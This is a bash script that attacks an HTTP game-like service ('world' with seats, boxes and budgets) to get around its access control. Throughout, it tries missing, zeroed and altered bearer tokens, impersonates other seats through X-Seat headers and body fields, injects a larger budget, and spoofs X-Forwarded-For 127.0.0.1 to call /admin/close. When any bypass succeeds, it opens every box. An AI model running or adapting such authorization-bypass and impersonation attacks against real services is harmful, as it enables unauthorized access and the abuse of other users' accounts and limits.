#!/bin/bash
set -u

WORLD=${WORLD:-http://world:8080}
BOXES=60
OWN="Authorization: Bearer $SEAT_TOKEN"
ZERO=00000000000000000000000000000000

send() {
  local method=$1 path=$2 reply
  shift 2
  if reply=$(curl -sS -m 20 -X "$method" "$WORLD$path" -w '\n%{http_code}' "$@"); then
    STATUS=${reply##*$'\n'}
    BODY=${reply%$'\n'*}
  else
    STATUS=000
    BODY=
  fi
}

attack() {
  local label=$1 fields=$2 box
  shift 2
  send POST /open -H 'Content-Type: application/json' -d "{\"box\": 1$fields}" "$@"
  echo "$label: $STATUS $BODY"
  [ "$STATUS" = 200 ] || return 0
  echo "$label works: this seat opens every box this way"
  for ((box = 2; box <= BOXES; box++)); do
    send POST /open -H 'Content-Type: application/json' -d "{\"box\": $box$fields}" "$@"
  done
}

send GET /rules -H "$OWN"
ME=$(jq -r '.you // empty' <<<"$BODY")
OTHERS=$(jq -r '.you as $me | .seats[]? | select(. != $me)' <<<"$BODY")
[ -n "$OTHERS" ] || OTHERS=admin
echo "seat $ME tries to act as: $(echo $OTHERS)"

attack "no token" ""
attack "token of zeros" "" -H "Authorization: Bearer $ZERO"
attack "own token, last character changed" "" -H "${OWN%?}x"
attack "no token, budget in the body" ', "budget_left": 99, "budget": 99'
for other in $OTHERS; do
  attack "seat name $other as token" "" -H "Authorization: Bearer $other"
  attack "no token, names $other" ", \"seat\": \"$other\"" -H "X-Seat: $other"
  attack "token $other, names $other" ", \"seat\": \"$other\"" -H "X-Seat: $other" -H "Authorization: Bearer $other"
  send GET "/rules?seat=$other" -H "$OWN" -H "X-Seat: $other"
  echo "own token, names $other: the world answers as $(jq -r '.you // empty' <<<"$BODY")"
  if [ "$STATUS" = 200 ] && [ "$(jq -r '.you // empty' <<<"$BODY")" = "$other" ]; then
    attack "own token, names $other" ", \"seat\": \"$other\"" -H "$OWN" -H "X-Seat: $other"
  fi
done

send POST /admin/close -H 'Content-Type: application/json' -d '{}'
echo "close without a token: $STATUS $BODY"
send POST /admin/close -H 'Content-Type: application/json' -d '{}' -H "$OWN" -H 'X-Forwarded-For: 127.0.0.1'
echo "close with the own token: $STATUS $BODY"
exit 0
